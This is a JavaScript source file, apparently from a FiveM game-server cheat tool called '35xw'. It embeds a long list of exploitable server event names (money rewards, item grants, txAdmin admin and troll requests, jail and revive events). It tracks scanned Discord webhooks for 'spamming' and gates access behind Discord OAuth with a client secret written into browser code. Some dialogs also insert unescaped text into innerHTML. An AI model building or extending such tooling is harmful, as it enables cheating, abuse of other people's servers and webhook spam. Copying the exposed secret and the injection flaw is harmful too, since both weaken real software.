    "qs-smartphone:server:sendJobAlert",
    "r_moneywash:onConnect",
    "r_moneywash:startWashingMoney",
    "radioList:leave",
    "radioList:setChannel",
    "rahe-speakers:server:openSpeakerShop",
    "rahe-speakers:server:purchaseSpeaker",
    "rahe-speakers:server:vehicleSpawnedByClient",
    "raid_clothes:openmenu",
    "randol_cs:onPlayerLogout",
    "rcore_basketball:addThrowPoint",
    "rcore_basketball:finishHoopSetup",
    "rcore_basketball:joinHoop",
    "rcore_basketball:loadPlacedHoops",
    "rcore_basketball:pickupBall",
    "rcore_basketball:placeHoop",
    "rcore_basketball:printConfig",
    "rcore_basketball:removePlayer",
    "rcore_basketball:removeThrowPoint",
    "rcore_basketball:requestHoopOwnership",
    "rcore_basketball:requestOpenSetup",
    "rcore_basketball:startAim",
    "rcore_basketball:startHoop",
    "rcore_basketball:stopAim",
    "rcore_basketball:takeHoop",
    "rcore_basketball:throwBall",
    "rcore_bowling:joinGame",
    "rcore_bowling:registerGame",
    "rcore_bowling:removePlayer",
    "rcore_bowling:requestCreateGame",
    "rcore_bowling:start",
    "rcore_bowling:takeBall",
    "rcore_casino:DataHasChanged",
    "rcore_casino:PlayerDataLoaded",
    "rcore_clothes:openOutfits",
    "rcore_clothing:reloadSkin",
    "rcore_dispatch:server:sendAlert",
    "rcore_garage:GivePlayerKey",
    "rcore_garage:OpenGarageOnSpot",
    "rcore_garage:StoreMyVehicle",
    "rcore_golf:deleteCaddy",
    "rcore_golf:disbandLobby",
    "rcore_golf:joinLobby",
    "rcore_golf:kickPlayer",
    "rcore_golf:leaveLobby",
    "rcore_golf:purchaseMembership",
    "rcore_golf:removeClubForPlayer",
    "rcore_golf:sendPendingLobbyData",
    "rcore_golf:setCaddyLocks",
    "rcore_golf:setShowRadar",
    "rcore_golf:setSubscribedToCourse",
    "rcore_golf:setSubscribedToUI",
    "rcore_golf:startGame",
    "rcore_prison:bridge:standalonePlayerActivated",
    "rcore_prison:request:saveOutfitIntoCache",
    "rcore_prison:server:JailByIdentifier",
    "rcore_prison:server:JailPlayer",
    "rcore_prison:server:UnjailPlayer",
    "rcore_prison:server:UpdateExerciseStats",
    "rcore_prison:server:requestCigarProductionFailed",
    "rcore_prison:server:requestCigarProductionReward",
    "rcore_prison:server:requestOpenJobMenu",
    "rcore_prison:server:requestPlayerLoaded",
    "rcore_prison:server:syncMugshot",
    "rcore_radiocar:fetchPermission",
    "rcore_radiocar:openUI",
    "rcore_radiocar:removeMusic",
    "rcore_radiocar:updateMusicInfo",
    "rcore_stats:server:playerSpawned",
    "rcore_tattoos:applyOwnedTattoos",
    "realisticVehicleSystem:server:addVehicle",
    "redutzu-ems:server:addDispatchToEMS",
    "resetcrutch",
    "ricky-server:blipCreateBlip",
    "ricky-server:blipDeleteBlip",
    "ricky-server:blipEditBlip",
    "ricky-vinewood:loadText",
    "ricky-vinewood:saveText",
    "risk-vehicleshopEVOX:buyVehicle",
    "rms-kajdanki:requestCuff",
    "rms-kajdanki:requestSearch",
    "robbery:server:forceOpenInventory",
    "robberys:rewardStep",
    "robnpc:giveItem",
    "route68_blackjack:givemoney",
    "rp:ServerKeybindCreate",
    "rp:ServerKeybindExist",
    "rp:ServerKeybindGrab",
    "rp:ServerKeybindUpdate",
    "rpemotes:ptfx:sync",
    "rpemotes:ptfx:syncProp",
    "rtx_themepark:Shooter:Started",
    "rtx_tv:InstallVehicleTVCustom",
    "ry-vehiclerental:giveMoney",
    "s_base:mining:server:sellingmineriosss",
    "scratchcard:givePrizeMoney",
    "sd-redzones:server:handleKillReward",
    "server:useFixKit",
    "servermanager:lockAtAirport",
    "shop:shopPurchase",
    "shops:buyItems",
    "skinchanger:change",
    "skinchanger:getData",
    "skinchanger:getSkin",
    "skinchanger:loadClothes",
    "skinchanger:loadDefaultModel",
    "skinchanger:loadSkin",
    "small:announce:server",
    "snatch:rewardPlayer",
    "snatch:sellLoot",
    "snipe-boombox:server:pickup",
    "society:openBossMenu",
    "solos-weed:server:itemadd",
    "spoodyFraud:attemptSellProduct",
    "spoodyFraud:interactionComplete",
    "spoodyFraud:restoreItem",
    "staff:setStaff",
    "staffchat:sendMessage",
    "storeRobbery:reward",
    "sunnyside_shops:buyItem",
    "sunnyside_shops:hasEnteredMarker",
    "sunnyside_shops:hasExitedMarker",
    "sunnyside_shops:menuClosed",
    "sunnyside_shops:menuOpened",
    "sv-kasetki:reward",
    "svdden_drugsellingv2:client:notify",
    "svdden_drugsellingv2:server:banplayer",
    "t-notify:client:Custom",
    "t1ger_keys:updateOwnedKeys",
    "t1ger_lib:server:addItem",
    "t1ger_lib:server:removeItem",
    "tKeyDrops:GetRewards",
    "tablet:deleteTabletObject",
    "tablet:failedControl",
    "tablet:police:removeDispatch",
    "tablet:services:toggleDuty",
    "tablet:setTabletObject",
    "tarp-drugs:server:giveItem",
    "taxi:fermer",
    "taxi:ouvert",
    "taxi:recruter",
    "taxi:rewardPlayer",
    "teleports:chooseloc",
    "tgiann-clothing:changeScriptClothe",
    "tk_drugs:addPed",
    "tk_drugs:sellDrugs",
    "toggleids:hide",
    "toggleids:show",
    "trainheist:server:rewardItems",
    "trainheist:server:sellRewardItems",
    "traprobbery:server:giveLoot",
    "trucker_job:giveMoney",
    "trucker_system:giveReward",
    "txcl:heal",
    "txcl:setPlayerMode",
    "txcl:spectate:start",
    "txcl:tpToWaypoint",
    "txsv:ackWarning",
    "txsv:checkIfAdmin",
    "txsv:logger:deathEvent",
    "txsv:req:bringPlayer",
    "txsv:req:changePlayerMode",
    "txsv:req:clearArea",
    "txsv:req:freezePlayer",
    "txsv:req:healEveryone",
    "txsv:req:healMyself",
    "txsv:req:healPlayer",
    "txsv:req:plist:getDetailed",
    "txsv:req:sendAnnouncement",
    "txsv:req:serverCtx",
    "txsv:req:showPlayerIDs",
    "txsv:req:spectate:cycle",
    "txsv:req:spectate:end",
    "txsv:req:spectate:start",
    "txsv:req:tpToCoords",
    "txsv:req:tpToPlayer",
    "txsv:req:tpToWaypoint",
    "txsv:req:troll:setDrunk",
    "txsv:req:troll:setOnFire",
    "txsv:req:troll:wildAttack",
    "txsv:req:vehicle:boost",
    "txsv:req:vehicle:delete",
    "txsv:req:vehicle:fix",
    "txsv:req:vehicle:spawn:fivem",
    "txsv:req:vehicle:spawn:redm",
    "txsv:startedWalking",
    "txsv:webpipe:req",
    "utKD6522Gk_oh:rewardGold",
    "utkGGjG23K_fh:rewardCash",
    "utk_oh:rewardCash",
    "utk_oh:rewardDia",
    "utk_oh:rewardGold",
    "vSync:requestSync",
    "vSync:toggle",
    "vSync:updateWeather",
    "vehiclekeys:client:SetOwner",
    "vehiclekeys:client:addKeys",
    "vehiclekeys:server:givekey",
    "vehicles_keys:selfGiveVehicleKeys",
    "visn_are:resetHealthBuffer",
    "vrp_slotmachine:server:2",
    "vrs-rps:server:RequestAccept",
    "wasabi_ambulance:billPatient",
    "wasabi_ambulance:billPlayer",
    "wasabi_ambulance:customInjuryClear",
    "wasabi_ambulance:deathCount",
    "wasabi_ambulance:diagnosePlayer",
    "wasabi_ambulance:dispatchMenu",
    "wasabi_ambulance:heal",
    "wasabi_ambulance:healTarget",
    "wasabi_ambulance:injurySync",
    "wasabi_ambulance:killPlayer",
    "wasabi_ambulance:logDeath",
    "wasabi_ambulance:onPlayerDistress",
    "wasabi_ambulance:placeInVehicle",
    "wasabi_ambulance:placePlayerOnStretcher",
    "wasabi_ambulance:putInVehicle",
    "wasabi_ambulance:qbBill",
    "wasabi_ambulance:requestSync",
    "wasabi_ambulance:restock",
    "wasabi_ambulance:revive",
    "wasabi_ambulance:reviveTarget",
    "wasabi_ambulance:setDeathStatus",
    "wasabi_ambulance:svToggleDuty",
    "wasabi_ambulance:tryRevive",
    "wasabi_ambulance:tryStandaloneRevive",
    "wasabi_ambulance:useBandage",
    "wasabi_ambulance:useSedative",
    "wasabi_backpack:openBackpack",
    "wasabi_boombox:soundStatus",
    "wasabi_boombox:syncActive",
    "wasabi_bridge:notify",
    "wasabi_bridge:onPlayerDeath",
    "wasabi_bridge:onPlayerSpawn",
    "wasabi_bridge:openPlayerInventory",
    "wasabi_bridge:openShop",
    "wasabi_bridge:openStash",
    "wasabi_crutch:giveChair",
    "wasabi_crutch:giveCrutch",
    "wasabi_crutch:updateChair",
    "wasabi_crutch:updateCrutch",
    "wasabi_mining:mineRock",
    "wasabi_police:addOfficerToGPS",
    "wasabi_police:addPlayerToTracking",
    "wasabi_police:addPoliceCount",
    "wasabi_police:billPlayer",
    "wasabi_police:breakLockpick",
    "wasabi_police:changeClothes",
    "wasabi_police:checkId",
    "wasabi_police:escortPlayer",
    "wasabi_police:escortPlayerStop",
    "wasabi_police:getPoliceOnline",
    "wasabi_police:handcuffPlayer",
    "wasabi_police:impoundVehicle",
    "wasabi_police:inVehiclePlayer",
    "wasabi_police:lockpickHandcuffs",
    "wasabi_police:lockpickVehicle",
    "wasabi_police:outVehiclePlayer",
    "wasabi_police:qbBill",
    "wasabi_police:qbPrisonJail",
    "wasabi_police:releasePlayer",
    "wasabi_police:removeCCTVCamera",
    "wasabi_police:removeSpeedTrap",
    "wasabi_police:searchPlayer",
    "wasabi_police:seizeCash",
    "wasabi_police:sendQBEmail",
    "wasabi_police:server:sendToJail",
    "wasabi_police:setGSR",
    "wasabi_police:setJailStatus",
    "wasabi_police:svToggleDuty",
    "wasabi_police:toggleTrackingBracelet",
    "wasabi_police:vehicleInfo",
    "weedroll:additem",
    "whizz-mainevent",
    "whizz-namechange_card:event",
    "whizz_purse:openPurse",
    "xSound:songStopPlaying",
    "x_addkeys",
    "xmmx_letscookplus:server:toggleItem",
    "xpack4.0_:cuffPlayer",
    "xpack4.0_:uncuffPlayer",
    "xsound:streamerMode",
    "zabierzitemy",
    "zabierzitemy2",
    "zabierzitemy3",
    "zat-snrbuns_shops:server:additem",
    "zerio-garage:client:OpenHousingGarage",
    "zerio-garage:client:PutBackHouseVehicle",
    "zones:lootZombie"
];

const discordAuth = {
    isAuthenticated: false,
    user: null,
    accessToken: null
};

const appState = {
    currentTab: 'triggers',
    triggerFilter: 'all', // 'all', 'server', 'client', 'general'
    riskFilter: 'all', // 'all', 'High', 'Medium', 'Low', 'Potential'
    itemsFilter: 'all', // 'all', 'item', 'weapon'
    knownTriggerTypeFilter: 'all', // 'all', 'server', 'client', 'general'
    knownTriggerRiskFilter: 'all', // 'all', 'High', 'Medium', 'Low'
    knownTriggers: new Set(),
    savedTriggers: [],
    webhooks: [],
    items: [],
    coordinates: [],
    serverDirectory: '',
    selectedFiles: [],
    scanResults: {
        triggers: [],
        knownTriggers: [],
        webhooks: [],
        items: [],
        coordinates: [],
        files: 0,
    },
    isSpamming: false,
    spamInterval: null,
    selectedWebhooks: [],
    manualWebhooks: [], // New: Stores manually added webhooks
    settings: {

    }
};

function saveTriggersToLocalStorage() {
    try {
        localStorage.setItem('savedTriggers', JSON.stringify(appState.savedTriggers));
    } catch (error) {
        console.error('Error saving triggers to localStorage:', error);
    }
}

function loadTriggersFromLocalStorage() {
    try {
        const savedTriggers = localStorage.getItem('savedTriggers');
        if (savedTriggers) {
            appState.savedTriggers = JSON.parse(savedTriggers);
            updateSavedTriggersList();
            updateStats();
        }
    } catch (error) {
        console.error('Error loading triggers from localStorage:', error);

        appState.savedTriggers = [];
    }
}


function clearAllSavedTriggers() {
    try {
        if (confirm('Are you sure you want to delete ALL saved triggers? This action cannot be undone!')) {
            appState.savedTriggers = [];
            saveTriggersToLocalStorage();
            updateSavedTriggersList();
            updateStats();
            showNotification('All saved triggers cleared', 'success');
        }
    } catch (error) {
        console.error('Error clearing saved triggers:', error);
        showNotification('Error clearing saved triggers', 'error');
    }
}


function navigateToFileInExplorer(filePath, resourceName) {
    try {

        const pathParts = filePath.split('/');
        const fileName = pathParts.pop(); // Get the filename
        const directoryPath = pathParts.join('/');

        const folderHeaders = document.querySelectorAll('.folder-header');

        let targetFolder = null;
        let targetFile = null;
        
        folderHeaders.forEach(header => {
            const folderName = header.querySelector('span').textContent;

            if (folderName === resourceName || folderName.includes(directoryPath) || 
                directoryPath.includes(folderName)) {

                const folderContent = header.nextElementSibling;
                if (folderContent && folderContent.style.display === 'none') {
                    header.click(); // This will expand the folder
                }
                
                targetFolder = header;

                setTimeout(() => {
                    const fileElements = folderContent.querySelectorAll('.resource-file');
                    fileElements.forEach(fileElement => {
                        const fileNameElement = fileElement.querySelector('span');
                        if (fileNameElement && fileNameElement.textContent === fileName) {

                            fileElement.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
                            fileElement.style.border = '1px solid #ededed';

                            fileElement.scrollIntoView({ behavior: 'smooth', block: 'center' });

                            setTimeout(() => {
                                fileElement.style.backgroundColor = '';
                                fileElement.style.border = '';
                            }, 3000);
                            
                            targetFile = fileElement;
                        }
                    });
                }, 100); // Small delay to ensure folder is expanded
            }
        });

        if (targetFolder) {
            targetFolder.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
        
    } catch (error) {
        console.error('Error navigating to file in explorer:', error);
    }
}

function editTriggerName(triggerId, currentName) {
    try {
        const trigger = appState.savedTriggers.find(t => t.id === triggerId);
        if (!trigger) return;

        const inputDialog = document.createElement('div');
        inputDialog.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        const dialogContent = document.createElement('div');
        dialogContent.style.cssText = `
            background: #2a2a2a;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #ededed;
            min-width: 300px;
            max-width: 500px;
        `;

        dialogContent.innerHTML = `
            <h3 style="color: #ffffff; margin: 0 0 15px 0;">Edit Trigger Name</h3>
            <input type="text" id="edit-trigger-name-input" value="${currentName}" style="
                width: 100%;
                padding: 10px;
                background: #1a1a1a;
                border: 1px solid #ededed;
                border-radius: 4px;
                color: #ffffff;
                font-size: 14px;
                margin-bottom: 15px;
            ">
            <div style="display: flex; gap: 10px; justify-content: flex-end;">
                <button id="cancel-edit-btn" style="
                    padding: 8px 16px;
                    background: #6c757d;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                ">Cancel</button>
                <button id="save-edit-btn" style="
                    padding: 8px 16px;
                    background: #ededed;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                ">Save</button>
            </div>
        `;

        inputDialog.appendChild(dialogContent);
        document.body.appendChild(inputDialog);

        const input = dialogContent.querySelector('#edit-trigger-name-input');
        const cancelBtn = dialogContent.querySelector('#cancel-edit-btn');
        const saveBtn = dialogContent.querySelector('#save-edit-btn');

        input.focus();
        input.select();

        const saveName = () => {
            const newName = input.value.trim();
            
            if (newName === '') {
                showNotification('Trigger name cannot be empty', 'error');
                return;
            }

            const existingTrigger = appState.savedTriggers.find(t => t.id !== triggerId && t.resource === newName);
            if (existingTrigger) {
                showNotification('A trigger with this name already exists', 'error');
                return;
            }
            
            trigger.resource = newName;
            saveTriggersToLocalStorage();
            updateSavedTriggersList();
            showNotification('Trigger name updated', 'success');
            document.body.removeChild(inputDialog);
        };

        const cancelEdit = () => {
            document.body.removeChild(inputDialog);
        };

        saveBtn.addEventListener('click', saveName);
        cancelBtn.addEventListener('click', cancelEdit);
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                saveName();
            }
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                cancelEdit();
            }
        });

        inputDialog.addEventListener('click', (e) => {
            if (e.target === inputDialog) {
                cancelEdit();
            }
        });

    } catch (error) {
        console.error('Error editing trigger name:', error);
        showNotification('Error updating trigger name', 'error');
    }
}

function editTriggerUsage(triggerId, currentUsage) {
    try {
        const trigger = appState.savedTriggers.find(t => t.id === triggerId);
        if (!trigger) return;

        const inputDialog = document.createElement('div');
        inputDialog.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        const dialogContent = document.createElement('div');
        dialogContent.style.cssText = `
            background: #2a2a2a;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #ededed;
            min-width: 400px;
            max-width: 700px;
        `;

        dialogContent.innerHTML = `
            <h3 style="color: #ffffff; margin: 0 0 15px 0;">Edit Trigger Usage</h3>
            <textarea id="edit-trigger-usage-input" style="
                width: 100%;
                padding: 10px;
                background: #1a1a1a;
                border: 1px solid #ededed;
                border-radius: 4px;
                color: #ffffff;
                font-size: 13px;
                font-family: 'Courier New', monospace;
                margin-bottom: 15px;
                min-height: 100px;
                resize: vertical;
            ">${currentUsage}</textarea>
            <div style="display: flex; gap: 10px; justify-content: flex-end;">
                <button id="cancel-edit-usage-btn" style="
                    padding: 8px 16px;
                    background: #6c757d;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                ">Cancel</button>
                <button id="save-edit-usage-btn" style="
                    padding: 8px 16px;
                    background: #ededed;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                ">Save</button>
            </div>
        `;

        inputDialog.appendChild(dialogContent);
        document.body.appendChild(inputDialog);

        const textarea = dialogContent.querySelector('#edit-trigger-usage-input');
        const cancelBtn = dialogContent.querySelector('#cancel-edit-usage-btn');
        const saveBtn = dialogContent.querySelector('#save-edit-usage-btn');

        textarea.focus();
        textarea.select();

        const saveUsage = () => {
            const newUsage = textarea.value.trim();
            
            if (newUsage === '') {
                showNotification('Trigger usage cannot be empty', 'error');
                return;
            }
            
            trigger.usage = newUsage;
            saveTriggersToLocalStorage();
            updateSavedTriggersList();
            showNotification('Trigger usage updated', 'success');
            document.body.removeChild(inputDialog);
        };

        const cancelEdit = () => {
            document.body.removeChild(inputDialog);
        };

        saveBtn.addEventListener('click', saveUsage);
        cancelBtn.addEventListener('click', cancelEdit);
        textarea.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                cancelEdit();
            }
        });

        inputDialog.addEventListener('click', (e) => {
            if (e.target === inputDialog) {
                cancelEdit();
            }
        });

    } catch (error) {
        console.error('Error editing trigger usage:', error);
        showNotification('Error updating trigger usage', 'error');
    }
}

function editSavedTrigger(triggerId) {
    try {
        const trigger = appState.savedTriggers.find(t => t.id === triggerId);
        if (!trigger) return;

        const inputDialog = document.createElement('div');
        inputDialog.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        const dialogContent = document.createElement('div');
        dialogContent.style.cssText = `
            background: #2a2a2a;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #ededed;
            min-width: 400px;
            max-width: 700px;
        `;

        dialogContent.innerHTML = `
            <h3 style="color: #ffffff; margin: 0 0 15px 0;">Edit Trigger</h3>
            <label style="color: #c7c7cf; font-size: 12px; margin-bottom: 5px; display: block;">Name:</label>
            <input type="text" id="edit-trigger-full-name-input" value="${trigger.resource.replace(/"/g, '&quot;')}" style="
                width: 100%;
                padding: 10px;
                background: #1a1a1a;
                border: 1px solid #ededed;
                border-radius: 4px;
                color: #ffffff;
                font-size: 14px;
                margin-bottom: 15px;
            ">
            <label style="color: #c7c7cf; font-size: 12px; margin-bottom: 5px; display: block;">Usage:</label>
            <textarea id="edit-trigger-full-usage-input" style="
                width: 100%;
                padding: 10px;
                background: #1a1a1a;
                border: 1px solid #ededed;
                border-radius: 4px;
                color: #ffffff;
                font-size: 13px;
                font-family: 'Courier New', monospace;
                margin-bottom: 15px;
                min-height: 100px;
                resize: vertical;
            ">${trigger.usage.replace(/"/g, '&quot;')}</textarea>
            <div style="display: flex; gap: 10px; justify-content: flex-end;">
                <button id="cancel-edit-full-btn" style="
                    padding: 8px 16px;
                    background: #6c757d;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                ">Cancel</button>
                <button id="save-edit-full-btn" style="
                    padding: 8px 16px;
                    background: #ededed;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                ">Save</button>
            </div>
        `;

        inputDialog.appendChild(dialogContent);
        document.body.appendChild(inputDialog);

        const nameInput = dialogContent.querySelector('#edit-trigger-full-name-input');
        const usageTextarea = dialogContent.querySelector('#edit-trigger-full-usage-input');
        const cancelBtn = dialogContent.querySelector('#cancel-edit-full-btn');
        const saveBtn = dialogContent.querySelector('#save-edit-full-btn');

        nameInput.focus();
        nameInput.select();

        const saveFull = () => {
            const newName = nameInput.value.trim();
            const newUsage = usageTextarea.value.trim();
            
            if (newName === '' || newUsage === '') {
                showNotification('Name and usage cannot be empty', 'error');
                return;
            }

            const existingTrigger = appState.savedTriggers.find(t => t.id !== triggerId && t.resource === newName);
            if (existingTrigger) {
                showNotification('A trigger with this name already exists', 'error');
                return;
            }
            
            trigger.resource = newName;
            trigger.usage = newUsage;
            saveTriggersToLocalStorage();
            updateSavedTriggersList();
            showNotification('Trigger updated', 'success');
            document.body.removeChild(inputDialog);
        };

        const cancelEdit = () => {
            document.body.removeChild(inputDialog);
        };

        saveBtn.addEventListener('click', saveFull);
        cancelBtn.addEventListener('click', cancelEdit);
        nameInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                usageTextarea.focus();
            }
        });
        usageTextarea.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                cancelEdit();
            }
        });

        inputDialog.addEventListener('click', (e) => {
            if (e.target === inputDialog) {
                cancelEdit();
            }
        });

    } catch (error) {
        console.error('Error editing trigger:', error);
        showNotification('Error updating trigger', 'error');
    }
}

const tabButtons = document.querySelectorAll('.tab-btn');
const tabContents = document.querySelectorAll('.tab-content');
// Exclude the directory-row Deep Scan / Clear Results (they have dedicated listeners by id).
// Otherwise the generic handleActionButton() handler would fire them a second time per click.
const actionButtons = document.querySelectorAll('.action-btn:not(.dir-action)');
const searchInput = document.getElementById('search-input');
const serverDirectoryInput = document.getElementById('server-directory-input');
const browseDirectoryBtn = document.getElementById('browse-directory-btn');
const browseBtn = document.getElementById('browse-btn');
const deepScanBtn = document.getElementById('deep-scan-btn');
const clearResultsBtn = document.getElementById('clear-results-btn');
const loadKnownTriggersBtn = document.getElementById('load-known-triggers-btn');

function showDiscordAuthModal() {
    const authModal = document.getElementById('discord-auth-modal');
    const mainApp = document.getElementById('main-app-container');
    
    if (authModal) authModal.style.display = 'flex';
    if (mainApp) mainApp.style.display = 'none';
    
    const loginBtn = document.getElementById('discord-login-btn');
    
    if (loginBtn) {
        loginBtn.onclick = () => {
            const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CONFIG.CLIENT_ID}&redirect_uri=${encodeURIComponent(DISCORD_CONFIG.REDIRECT_URI)}&response_type=code&scope=${encodeURIComponent(DISCORD_CONFIG.SCOPE)}`;
            window.location.href = authUrl;
        };
    }
}

function showMainApp() {
    const authModal = document.getElementById('discord-auth-modal');
    const mainApp = document.getElementById('main-app-container');
    
    if (authModal) authModal.style.display = 'none';
    if (mainApp) mainApp.style.display = 'flex';
}

async function handleDiscordCallback(code) {
    try {

        const response = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
                client_id: DISCORD_CONFIG.CLIENT_ID,
                client_secret: 'PG3bs4Ohro1558g8FHG92lyiSwbsi56S',
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: DISCORD_CONFIG.REDIRECT_URI
            })
        });
        
        if (!response.ok) {
            throw new Error('Failed to exchange code for token');
        }
        
        const tokenData = await response.json();
        const accessToken = tokenData.access_token;

        const userResponse = await fetch('https://discord.com/api/users/@me', {
            headers: {
                'Authorization': `Bearer ${accessToken}`
            }
        });
        
        if (!userResponse.ok) {
            throw new Error('Failed to get user info');
        }
        
        const user = await userResponse.json();

        const guildResponse = await fetch(`https://discord.com/api/users/@me/guilds`, {
            headers: {
                'Authorization': `Bearer ${accessToken}`
            }
        });
        
        let isInGuild = false;
        if (guildResponse.ok) {
            const guilds = await guildResponse.json();
            isInGuild = guilds.some(guild => guild.id === DISCORD_CONFIG.GUILD_ID);
        }

        if (!isInGuild) {
            showNotification('You must join our Discord server to use this tool. Opening invite...', 'error');

            localStorage.removeItem('discordAuth');

            window.open('https://discord.gg/webhooked', '_blank');

            const authModal = document.getElementById('discord-auth-modal');
            if (authModal) {
                const modalContent = authModal.querySelector('.discord-auth-content');
                if (modalContent) {
                    modalContent.innerHTML = `
                        <div style="text-align: center; padding: 20px;">
                            <h3 style="color: #fff; margin-bottom: 15px;">Join Our Discord Server</h3>
                            <p style="color: #c7c7cf; margin-bottom: 20px;">
                                You must join our Discord server to use this tool.<br>
                                An invite link has been opened in a new tab.
                            </p>
                            <p style="color: #9a9aa8; font-size: 14px; margin-bottom: 20px;">
                                After joining, refresh this page and login again.
                            </p>
                            <button id="refresh-after-join-btn" class="discord-login-btn" style="margin-top: 10px;">
                                <i class="fas fa-sync-alt"></i>
                                Refresh Page
                            </button>
                        </div>
                    `;
                    
                    const refreshBtn = document.getElementById('refresh-after-join-btn');
                    if (refreshBtn) {
                        refreshBtn.onclick = () => {
                            window.location.reload();
                        };
                    }
                }
            }
            
            showDiscordAuthModal();
            return;
        }

        let hasRequiredRole = false;
        let roleCheckFailed = false;
        try {
            const memberResponse = await fetch(`https://discord.com/api/users/@me/guilds/${DISCORD_CONFIG.GUILD_ID}/member`, {
                headers: {
                    'Authorization': `Bearer ${accessToken}`
                }
            });
            
            if (memberResponse.ok) {
                const member = await memberResponse.json();
                console.log('Member data:', member); // Debug log
                if (member && member.roles && Array.isArray(member.roles)) {
                    console.log('User roles:', member.roles); // Debug log
                    console.log('Required role ID:', DISCORD_CONFIG.REQUIRED_ROLE_ID); // Debug log
                    hasRequiredRole = member.roles.includes(DISCORD_CONFIG.REQUIRED_ROLE_ID);
                    console.log('Has required role:', hasRequiredRole); // Debug log
                } else {
                    console.error('Member data invalid or missing roles:', member);
                    roleCheckFailed = true;
                }
            } else {
                console.error('Failed to get member data. Status:', memberResponse.status, memberResponse.statusText);
                const errorText = await memberResponse.text();
                console.error('Error response:', errorText);
                roleCheckFailed = true;
            }
        } catch (roleError) {
            console.error('Error checking user role:', roleError);
            roleCheckFailed = true;
        }

        if (roleCheckFailed || !hasRequiredRole) {
            console.error('Access denied - Role check failed or user does not have required role');
            console.error('Role check failed:', roleCheckFailed);
            console.error('Has required role:', hasRequiredRole);
            
            showNotification('You do not have the required role to use this tool.', 'error');

            localStorage.removeItem('discordAuth');
            discordAuth.isAuthenticated = false;
            discordAuth.user = null;
            discordAuth.accessToken = null;

            const authModal = document.getElementById('discord-auth-modal');
            if (authModal) {
                const modalContent = authModal.querySelector('.discord-auth-content');
                if (modalContent) {
                    modalContent.innerHTML = `
                        <div style="text-align: center; padding: 20px;">
                            <h3 style="color: #fff; margin-bottom: 15px;">Access Denied</h3>
                        </div>
                    `;
                }
            }
            
            showDiscordAuthModal();
            return;
        }

        console.log('Access granted - User has required role');
        
        const authData = {
            accessToken: accessToken,
            user: user,
            expiresAt: Date.now() + (tokenData.expires_in * 1000)
        };
        
        discordAuth.isAuthenticated = true;
        discordAuth.user = user;
        discordAuth.accessToken = accessToken;
        
        localStorage.setItem('discordAuth', JSON.stringify(authData));

        window.history.replaceState({}, document.title, window.location.pathname);

        initializeAppAfterAuth();
        
    } catch (error) {
        console.error('Error handling Discord callback:', error);
        showNotification('Authentication failed. Please try again.', 'error');
        showDiscordAuthModal();
    }
}

async function addUserToGuild(userId, accessToken) {
    try {





        const inviteUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CONFIG.CLIENT_ID}&scope=bot&permissions=0&guild_id=${DISCORD_CONFIG.GUILD_ID}&response_type=code&redirect_uri=${encodeURIComponent(DISCORD_CONFIG.REDIRECT_URI)}`;







        return false; // Return false to trigger invite link redirect
    } catch (error) {
        console.error('Error adding user to guild:', error);
        return false;
    }
}

async function checkGuildMembership() {



    return true;
}

async function loadKnownTriggers() {
    try {
        appState.knownTriggers = new Set(EMBEDDED_KNOWN_TRIGGERS);
        console.log(`Loaded ${appState.knownTriggers.size} known triggers from embedded list`);
    } catch (error) {
        console.error('Error loading known triggers:', error);
        appState.knownTriggers = new Set();
    }
}



async function initializeAppAfterAuth() {

    loadTriggersFromLocalStorage();
    await loadKnownTriggers();
    initializeApp();
    loadSampleData();
    updateStats();

    checkWebCompatibility();

    showMainApp();
    logSiteAccess();

    initGlobalDragDrop();
    initTwofa();

    showNotification('Welcome to 35xw', 'success');
}

function initDiscordAuth() {
    if (!DISCORD_CONFIG.ENABLED) {

        initializeAppAfterAuth();
        return;
    }

    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    
    if (code) {

        handleDiscordCallback(code);
        return;
    }

    const storedAuth = localStorage.getItem('discordAuth');
    
    if (storedAuth) {
        try {
            const authData = JSON.parse(storedAuth);

            if (authData.expiresAt && Date.now() < authData.expiresAt) {

                verifyGuildMembership(authData.accessToken);
            } else {

                localStorage.removeItem('discordAuth');
                showDiscordAuthModal();
            }
        } catch (error) {
            console.error('Error parsing stored auth:', error);
            localStorage.removeItem('discordAuth');
            showDiscordAuthModal();
        }
    } else {

        showDiscordAuthModal();
    }
}

async function verifyGuildMembership(accessToken) {
    try {
        const guildResponse = await fetch(`https://discord.com/api/users/@me/guilds`, {
            headers: {
                'Authorization': `Bearer ${accessToken}`
            }
        });
        
        if (guildResponse.ok) {
